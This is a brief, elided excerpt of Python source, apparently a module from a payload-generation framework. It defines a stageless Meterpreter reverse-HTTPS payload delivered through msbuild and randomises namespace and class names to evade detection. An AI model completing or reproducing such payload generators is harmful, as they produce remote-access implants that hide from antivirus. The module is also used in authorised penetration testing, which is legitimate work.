...
class PayloadModule:
    ...
    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_http stageless"
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Excellent"
        self.name = "Pure msbuild Reverse HTTPS Stageless"
    ...
    def generate(self):
        ...
        payload_code += "namespace %s { class %s {\n" % (bypass_helpers.randomString(), bypass_helpers.randomString())
